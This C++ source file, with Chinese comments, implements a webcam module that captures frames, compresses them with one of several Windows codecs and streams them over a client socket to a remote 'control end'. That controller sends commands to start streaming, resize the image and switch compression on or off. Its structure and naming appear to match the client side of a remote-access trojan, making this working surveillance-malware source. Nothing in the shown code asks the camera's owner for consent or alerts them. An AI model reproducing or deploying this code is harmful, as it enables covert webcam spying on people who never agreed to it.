// VideoManager.cpp: implementation of the CVideoManager class.
//
//////////////////////////////////////////////////////////////////////

#include "VideoManager.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CVideoManager::CVideoManager(CClientSocket *pClient) : CManager(pClient)
{
 	m_pVideoCap = NULL;
	m_pVideoCodec = NULL;
 	m_bIsWorking = true;
	m_bIsCompress = true;
	m_nVedioWidth = 0;
	m_nVedioHeight = 0;
	m_fccHandler = 0;
 	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL, true);
}

CVideoManager::~CVideoManager()
{
	InterlockedExchange((LPLONG)&m_bIsWorking, false);
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CloseHandle(m_hWorkThread);
}

void CVideoManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_NEXT:
		NotifyDialogIsOpen();
		break;
	case COMMAND_WEBCAM_ENABLECOMPRESS: // 要求啟用壓縮
		{
			// 如果解碼器初始化正常，就啟動壓縮功能
			if (m_pVideoCodec)
				InterlockedExchange((LPLONG)&m_bIsCompress, true);
		}
		break;
	case COMMAND_WEBCAM_DISABLECOMPRESS:
		InterlockedExchange((LPLONG)&m_bIsCompress, false);
		break;
	case COMMAND_WEBCAM_RESIZE:
		ResetScreen(*((LPDWORD)(lpBuffer + 1)), *((LPDWORD)(lpBuffer + 5)));
		break;
	default:	
		break;
	}	
}

void CVideoManager::sendBITMAPINFO()
{
	DWORD	dwBytesLength = 1 + sizeof(BITMAPINFO);
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (lpBuffer == NULL)
		return;

	lpBuffer[0] = TOKEN_WEBCAM_BITMAPINFO;
	memcpy(lpBuffer + 1, m_pVideoCap->m_lpbmi, sizeof(BITMAPINFO));
	Send(lpBuffer, dwBytesLength);

	delete [] lpBuffer;		
}

void CVideoManager::sendNextScreen()
{
	LPVOID	lpDIB = m_pVideoCap->GetDIB();
	// token + IsCompress + m_fccHandler + DIB
	int		nHeadLen = 1 + 1 + 4;

	UINT	nBufferLen = nHeadLen + m_pVideoCap->m_lpbmi->bmiHeader.biSizeImage;
	LPBYTE	lpBuffer = new BYTE[nBufferLen];
	if (lpBuffer == NULL)
		return;

	lpBuffer[0] = TOKEN_WEBCAM_DIB;
	lpBuffer[1] = m_bIsCompress;
	memcpy(lpBuffer + 2, &m_fccHandler, sizeof(DWORD));

	UINT	nPacketLen = 0;
	if (m_bIsCompress && m_pVideoCodec)
	{
		int	nCompressLen = 0;
		bool bRet = m_pVideoCodec->EncodeVideoData((LPBYTE)lpDIB, 
			m_pVideoCap->m_lpbmi->bmiHeader.biSizeImage, lpBuffer + nHeadLen, &nCompressLen, NULL);
		if (!nCompressLen)
		{
			// some thing ...
			return;
		}
		nPacketLen = nCompressLen + nHeadLen;
	}
	else
	{
		memcpy(lpBuffer + nHeadLen, lpDIB, m_pVideoCap->m_lpbmi->bmiHeader.biSizeImage);
		nPacketLen = m_pVideoCap->m_lpbmi->bmiHeader.biSizeImage + nHeadLen;
	}

	Send(lpBuffer, nPacketLen);

	delete [] lpBuffer;
}

void CVideoManager::ResetScreen(int nWidth, int nHeight)
{
	InterlockedExchange((LPLONG)&m_bIsWorking, false);
	WaitForSingleObject(m_hWorkThread, INFINITE);

	// 更新視頻大小
	m_nVedioWidth = nWidth;
	m_nVedioHeight = nHeight;

	InterlockedExchange((LPLONG)&m_bIsWorking, true);
	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL, true);
}

DWORD WINAPI CVideoManager::WorkThread( LPVOID lparam )
{
	static int dwLastScreen = GetTickCount();

	CVideoManager *pThis = (CVideoManager *)lparam;
	
	if (!pThis->Initialize())
	{
		pThis->Destroy();
		pThis->m_pClient->Disconnect();
		return -1;
	}
	pThis->sendBITMAPINFO();
	// 等控制端對話框打開
	pThis->WaitForDialogOpen();

	while (pThis->m_bIsWorking)
	{
		// 限制速度
 		if ((GetTickCount() - dwLastScreen) < 150)
 			Sleep(100);
 		dwLastScreen = GetTickCount();
		pThis->sendNextScreen();
	}
	// 銷毀已經存在實例，方便重新調整
	pThis->Destroy();

	return 0;
}

bool CVideoManager::Initialize()
{
	bool	bRet = false;
	// 正在使用中
	if (!CVideoCap::IsWebCam())
		return false;

	m_pVideoCap = new CVideoCap;

	// 指定了固定大小
	if (m_nVedioWidth && m_nVedioHeight)
	{
		bRet = m_pVideoCap->Initialize(m_nVedioWidth, m_nVedioHeight);
	}
	else
	{
		// 測試H263編碼器支持的兩種大小,優先考慮
		bRet = m_pVideoCap->Initialize(352, 288);
		if (!bRet)
			bRet = m_pVideoCap->Initialize(176, 144);

		// 嘗試系統默認的
		if (!bRet)
			bRet = m_pVideoCap->Initialize();

	}

	// 不要求壓縮或者CVideoCap初始化失敗
	if (!bRet)
		return bRet;

	// 從這幾種解編器中選一種
	DWORD	fccHandlerArray[] = 
	{
		859189837,	// Microsoft H.263 Video Codec
		842225225,	// Intel Indeo(R) Video R3.2
		842289229,	// Microsoft MPEG-4 Video Codec V2
		1684633187	// Cinepak Codec by Radius
	};

	for (int i = 0; i < sizeof(fccHandlerArray) / sizeof(fccHandlerArray[0]); i++)
	{
		m_pVideoCodec = new CVideoCodec;
		if (!m_pVideoCodec->InitCompressor(m_pVideoCap->m_lpbmi, fccHandlerArray[i]))
		{
			delete m_pVideoCodec;
			// 置NULL, 發送時判斷是否為NULL來判斷是否壓縮
			m_pVideoCodec = NULL;
		}
		else
		{
			m_fccHandler = fccHandlerArray[i];
			break;
		}
	}
	return bRet;
}

void CVideoManager::Destroy()
{
	if (m_pVideoCap)
	{
		delete m_pVideoCap;
		m_pVideoCap = NULL;
	}
	if (m_pVideoCodec)
	{
		delete m_pVideoCodec;
		m_pVideoCodec = NULL;
	}
}
